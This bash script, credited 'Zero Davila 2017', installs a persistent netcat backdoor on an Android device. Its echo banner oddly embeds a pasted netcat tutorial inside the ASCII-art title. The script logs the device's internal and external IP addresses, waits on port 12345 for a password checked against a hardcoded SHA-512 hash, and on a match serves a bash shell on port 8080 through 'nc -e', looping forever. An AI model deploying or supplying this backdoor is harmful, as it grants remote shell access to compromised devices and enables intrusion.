#!/bin/bash

echo """
    ____                 _      __             __ 
   / __ \___  __________(_)____/ /____  ____  / /_
  / /_/ / _ \/ ___/ ___/ / ___/ __/ _ \/ __ \/ __/
 / ____/  __/ /  (__  ) (__  ) /_/  __/ / / / /_  
/_/    \___/_/  /____/_/____/\__/\___/_/ /_/\__/  
    _   __  
8 Practical Linux Netcat NC Command Examples
by Himanshu Arora on April 23, 2012

Netcat or nc is a networking utility for debugging and investigating the network.

This utility can be used for creating TCP/UDP connections and investigating them. The biggest use of this utility is in the scripts where we need to deal with TCP/UDP sockets.

In this article we will learn about the netcat command by some practical examples.
1. Netcat in a Server-Client Architecture

The netcat utility can be run in the server mode on a specified port listening for incoming connections.

$ nc -l 2389

Also, it can be used in client mode trying to connect on the port(2389) just opened

$ nc localhost 2389

Now, if we write some text at the client side, it reaches the server side. Here is the proof :

$ nc localhost 2389
HI, server

On the terminal where server is running :

$ nc -l 2389
HI, server

So we see that netcat utility can be used in the client server socket communication.
2. Use Netcat to Transfer Files

The netcat utility can also be used to transfer files. At the client side, suppose we have a file named ‘testfile’ containing :

$ cat testfile
hello test

and at the server side we have an empty file ‘test’

Now, we run the server as :

$ nc -l 2389 > test

and run the client as :

cat testfile | nc localhost 2389

Now, when we see the ‘test’ file at the server end, we see :

$ cat test
hello test

So we see that the file data was transfered from client to server.
3. Netcat Supports Timeouts

There are cases when we do not want a connection to remain open forever. In that case, through ‘-w’ switch we can specify the timeout in a connection. So after the seconds specified along with -w flag, the connection between the client and server is terminated.

Server :

nc -l 2389

Client :

$ nc -w 10 localhost 2389

The connection above would be terminated after 10 seconds.

NOTE : Do not use the -w flag with -l flag at the server side as in that case -w flag causes no effect and hence the connection remains open forever.
4. Netcat Supports IPV6 Connectivity

The flag -4 or -6 specifies that netcat utility should use which type of addresses. -4 forces nc to use IPV4 address while -6 forces nc to use IPV6 address.

Server :

$ nc -4 -l 2389

Client :

$ nc -4 localhost 2389

Now, if we run the netstat command, we see :

$ netstat | grep 2389
tcp        0      0 localhost:2389          localhost:50851         ESTABLISHED
tcp        0      0 localhost:50851         localhost:2389          ESTABLISHED   __             __ 
   / | / /__  / /__________ _/ /_
  /  |/ / _ \/ __/ ___/ __ \`/ __/
 / /|  /  __/ /_/ /__/ /_/ / /_  
/_/ |_/\___/\__/\___/\__,_/\__/  
    ____             __       __                
   / __ )____ ______/ /______/ /___  ____  _____
  / __  / __ \`/ ___/ //_/ __  / __ \/ __ \/ ___/
 / /_/ / /_/ / /__/ ,< / /_/ / /_/ / /_/ / /    
/_____/\__,_/\___/_/|_|\__,_/\____/\____/_/     
======== Zero Davila 2017 ======================
"""

echo "[-] Moving to sdcard"
cd /sdcard
echo "[-] Checking for persistentNC directory"
if [ ! -d "persistentNC" ]; then
    echo "[-] Not found. Creating persistentNC directory..."
    mkdir persistentNC
else
    echo "[-] Directory found"
fi

NOW=`date`
CONECTIONS=1
FAILED=1
EXT_IP=`jping 4.ifcfg.me | grep Address | cut -d' ' -f6`
CLIENT=`netstat | grep 12345 | cut -d' ' -f16 | cut -d':' -f4`

echo
echo "[...] Netcat backdoor active since [$NOW]" >> persistentNC/persistentNCbackdoor.log
echo "[...] Request port [12345]" >> persistentNC/persistentNCbackdoor.log
echo "[...] Shell port [8080]" >> persistentNC/persistentNCbackdoor.log
echo "[...] Internal address [`ifconfig wlan0 | awk '$1 == "inet" {print $2}'`]" >> persistentNC/persistentNCbackdoor.log
echo "[...] External address [`telnet $EXT_IP | grep IPv4 | cut -d' ' -f4`]" >> persistentNC/persistentNCbackdoor.log
cat persistentNC/persistentNCbackdoor.log | tail -n-5
echo

while :
do
    nc -l -p 12345 | while read LINE
    do
        # Default is "Shell-access"
        SHELL_MATCH=$(echo $LINE | sha512sum | grep -c '870c042ce30e4908f0393eeb32b4b05f6644f597ceef71b8e93cf418fac01e5cea81f9a825ca3e5393d108919fa79dc15a27441c3a20af3b8a8d9aa2fb3d71ff')
       
        if [ $SHELL_MATCH -eq 1 ]; then
            echo "[+] Server shell access number [$CONECTIONS] granted to [$CLIENT] at [$(date)]" >> persistentNC/persistentNCbackdoor.log
            cat persistentNC/persistentNCbackdoor.log | tail -n-1
            nc -l -p 8080 -e /data/data/com.spartacusrex.spartacuside/files/system/bin/bash
            echo "[-] Shell access number [$CONECTIONS] to [$CLIENT] terminated at [$(date)]" >> persistentNC/persistentNCbackdoor.log
            cat persistentNC/persistentNCbackdoor.log | tail -n-1           
            let CONECTIONS++
        else
            echo "[!] WARNING: Failed login atempt number [$FAILED] from [$CLIENT] at [$(date)]" >> persistentNC/persistentNCbackdoor.log
            cat persistentNC/persistentNCbackdoor.log | tail -n-1       
            let FAILED++
        fi
    done
done
